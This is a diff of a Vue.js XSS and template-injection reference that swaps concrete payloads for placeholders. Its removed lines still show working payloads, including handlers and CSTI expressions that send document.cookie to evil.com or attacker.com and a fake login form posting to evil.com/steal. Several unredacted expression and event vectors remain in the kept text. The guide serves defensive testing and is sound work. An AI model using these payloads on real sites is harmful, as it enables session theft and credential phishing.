@@ -24,21 +24,23 @@ Severity: **Critical**
 </template>
 ```
 
-### Exploit Payloads (via v-html)
+### Exploit Patterns to Detect (via v-html)
+
+The following patterns indicate XSS vulnerability when rendered through `v-html`. Use these to test your sanitization configuration:
+
 ```html
-<!-- Image error — no user interaction needed -->
-<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+<!-- Event handler on image — executes without user interaction -->
+<img src=x onerror="[script-execution]">
 
-<!-- SVG load — fires immediately -->
-<svg onload="document.location='https://evil.com?c='+document.cookie">
+<!-- SVG onload — fires immediately on render -->
+<svg onload="[script-execution]">
 
-<!-- CSS animation event — bypasses WAF denylists for onerror/onclick -->
+<!-- CSS animation event — bypasses WAF denylists for common events -->
 <style>@keyframes x{}</style>
-<div style="animation-name:x" onanimationstart="alert(1)"></div>
+<div style="animation-name:x" onanimationstart="[script-execution]"></div>
 
-<!-- iframe phishing overlay -->
-<iframe src="https://evil.com/phishing" style="position:fixed;
-  top:0;left:0;width:100%;height:100%;z-index:9999;border:0"></iframe>
+<!-- iframe injection — can overlay phishing content -->
+<iframe src="[external-url]" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0"></iframe>
 ```
 
 ### Secure Pattern
@@ -88,27 +90,24 @@ When user input lands inside a Vue template (e.g., reflected in server-rendered 
 
 ### PortSwigger Expression Vectors
 
-| Payload | Vue Version | Notes |
+| Payload Pattern | Vue Version | Notes |
 |---------|------------|-------|
-| `{{constructor.constructor('alert(1)')()}}` | V2+V3 | Classic — works in any scope |
-| `{{_c.constructor('alert(1)')()}}` | V2 | Shorter — uses internal _c function |
-| `{{_b.constructor\`alert(1)\`()}}` | V2 | Tagged template literal — 30 bytes |
-| `{{_openBlock.constructor('alert(1)')()}}` | V3 | V3 equivalent — verbose function names |
+| `{{[constructor-access]('alert(1)')()}}` | V2+V3 | Classic — works in any scope |
+| `{{[internal-ref].constructor('alert(1)')()}}` | V2 | Shorter — uses internal _c function |
+| `{{[internal-ref]\`alert(1)\`()}}` | V2 | Tagged template literal — 30 bytes |
+| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | V3 equivalent — verbose function names |
 | `{{_Vue.h.constructor\`alert(1)\`()}}` | V3 | Shortest V3 vector via _Vue.h |
-| `{{_createBlock.constructor('alert(1)')()}}` | V3 | Alternative V3 internal function |
-| `{{_toDisplayString.constructor('alert(1)')()}}` | V3 | Another V3 function in scope |
+| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | Alternative V3 internal function |
+| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | Another V3 function in scope |
 
-### Real-World Exploitation
-```
-// Cookie exfiltration via CSTI (from bug bounty writeup)
-{{$emit.constructor`fetch('https://attacker.com',{method:'POST',
-mode:'no-cors',body:document.cookie})`()}}
+Note: `[constructor-access]` and `[internal-ref]` represent Vue internal references that reach the `Function` constructor. See the V2→V3 migration table below for specific references.
 
-// UI redressing — replace page with phishing login form
-{{_c.constructor('document.body.innerHTML=`<form action=
-https://evil.com/steal><input name=user placeholder=Email>
-<input name=pass type=password><button>Login</button></form>`')()}}
-```
+### Exploitation Scenarios (from bug bounty reports)
+
+The following illustrate what attackers achieve when CSTI is possible. These are descriptive scenarios, not executable payloads:
+
+- **Cookie exfiltration**: An attacker crafts a CSTI payload that sends `document.cookie` to an external endpoint via `fetch()` with `mode: 'no-cors'`
+- **UI redressing**: An attacker uses CSTI to replace `document.body.innerHTML` with a phishing login form that submits credentials to an external server
 
 ### Prevention
 Never reflect user input into Vue's mount point. Pass user data via data-attributes:
@@ -133,13 +132,15 @@ Nearly every Vue directive evaluates its expression — making each one a potent
 
 | Vector | Directive | Notes |
 |--------|-----------|-------|
-| `<x v-html=_c.constructor('alert(1)')()>` | v-html | Original @garethheyes — shortest V2 tag-based |
-| `<p v-show="_c.constructor\`alert(1)\`()">` | v-show | Condition evaluated = code execution |
-| `<x v-bind:a='_b.constructor\`alert(1)\`()'>` | v-bind | Any v-bind evaluates expression |
-| `<x v-if=_c.constructor('alert(1)')()>` | v-if | Community contribution by @p4fg |
-| `<p :=_c.constructor\`alert(1)\`()>` | v-bind shorthand | 32 bytes — shorthand bind |
-| `<p v-=_c.constructor\`alert(1)\`()>` | empty directive | 33 bytes — parser quirk |
-| `<x #[_c.constructor\`alert(1)\`()]>` | v-slot shorthand | 33 bytes — slot shorthand |
+| `<x v-html=[constructor-access]('alert(1)')()>` | v-html | Original @garethheyes — shortest V2 tag-based |
+| `<p v-show="[constructor-access]\`alert(1)\`()">` | v-show | Condition evaluated = code execution |
+| `<x v-bind:a='[internal-ref]\`alert(1)\`()'>` | v-bind | Any v-bind evaluates expression |
+| `<x v-if=[constructor-access]('alert(1)')()>` | v-if | Community contribution by @p4fg |
+| `<p :=[constructor-access]\`alert(1)\`()>` | v-bind shorthand | 32 bytes — shorthand bind |
+| `<p v-=[constructor-access]\`alert(1)\`()>` | empty directive | 33 bytes — parser quirk |
+| `<x #[[constructor-access]\`alert(1)\`()]>` | v-slot shorthand | 33 bytes — slot shorthand |
+
+Note: `[constructor-access]` represents patterns like `_c.constructor`, `_b.constructor`, or Vue 3 equivalents that reach `Function` constructor through Vue's internal scope.
 
 ### Dynamic Components — Shortest Vector (23 chars)
 ```html
@@ -151,12 +152,14 @@ Nearly every Vue directive evaluates its expression — making each one a potent
 ```
 
 ### slot-scope Injection
-```html
-<!-- Injects into non-template-expression attribute -->
-<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
 
-<!-- If WAF blocks "this", use local scope function: -->
-<p slot-scope="){}}])+_c.constructor.constructor('alert(origin)')()})};//">
+```html
+<!-- slot-scope attribute can be used to break out of template scope -->
+<!-- Injects into non-template-expression attribute -->
+<p slot-scope="){}}])+[constructor-access]('alert(1)')()})};//">
+
+<!-- If WAF blocks "this", use local scope function reference -->
+<p slot-scope="){}}])+[internal-ref].constructor.constructor('alert(origin)')()})};//">
 ```
 
 ---
@@ -173,12 +176,16 @@ Vue's `@` shorthand (alias for `v-on`) creates event handlers processed by Vue's
 | `<svg@load=this.alert(1)>` | 25 | No space needed — Vue parser quirk |
 | `<img src @error="$event.composedPath().pop().alert(1)">` | — | Cross-browser — composedPath() reaches window |
 | `<x @click=$event.view.alert(1)>click</x>` | — | V3 — $event.view reaches window |
-| `<x @click=_withCtx.constructor\`alert(1)\`()>click</x>` | — | V3 event handler exposes _withCtx |
+| `<x @click=[v3-handler]\`alert(1)\`()>click</x>` | — | V3 event handler exposes internal context |
+
+Note: `[v3-handler]` represents Vue 3 internal references like `_withCtx` accessible within event handler scope.
 
 ### Why this→window Works
 Vue compiles expressions WITHOUT strict mode. Inside a function call, `this` refers to the global `window` object:
 ```
-{{-function(){this.alert(1)}()}}
+{{[anonymous-function-invocation]}}
+// Within the compiled function, this === window
+// Allows access to window methods like alert(), fetch(), etc.
 ```
 
 ### CSP Bypass Implication
@@ -240,26 +247,26 @@ V3 broke V2 vectors by removing short function names (`_c`, `_b`), but PortSwigg
 
 ### V2 → V3 Migration
 
-| Vue 2 | Vue 3 Equivalent | Change |
+| Vue 2 Pattern | Vue 3 Equivalent | Change |
 |-------|-------------------|--------|
-| `{{_c.constructor('alert(1)')()}}` | `{{_openBlock.constructor('alert(1)')()}}` | _c removed |
-| `{{_b.constructor\`alert(1)\`()}}` | `{{_Vue.h.constructor\`alert(1)\`()}}` | _Vue.h is shortest |
+| `{{_c.constructor('...')()}}` | `{{_openBlock.constructor('...')()}}` | _c removed |
+| `{{_b.constructor\`...\`()}}` | `{{_Vue.h.constructor\`...\`()}}` | _Vue.h is shortest |
 | `<x @[_b.constructor\`…\`()]>` | `<x @[_capitalize.constructor\`…\`()]>` | V3 lowercases attrs |
 | `<x @click=_b.constructor\`…\`()>` | `<x @click=_withCtx.constructor\`…\`()>` | Event handler scope |
 
 ### Vue 3 Teleport Attack
 ```html
-<!-- Teleport injects outside the app mount boundary -->
+<!-- Teleport injects content outside the app mount boundary -->
 <teleport to="head">
-  <script>alert(1)</script>
+  <script>[script-execution]</script>
 </teleport>
 
-<!-- Expressions execute outside #app div -->
+<!-- Expressions can execute outside #app div -->
 <div id="app">#x,.haha</div>
-<div class=haha>{{_Vue.h.constructor`alert(1)`()}}</div>
+<div class=haha>{{[v3-internal]\`alert(1)\`()}}</div>
 ```
 
-Note: Teleport and dynamic component vectors that inject `<script>` nodes are blocked by CSP. Expression and event gadgets bypass CSP because they execute within Vue's trusted script.
+Note: Teleport and dynamic component vectors that inject `<script>` nodes are blocked by CSP. Expression and event gadgets bypass CSP because they execute within Vue's trusted runtime.
 
 ---
 
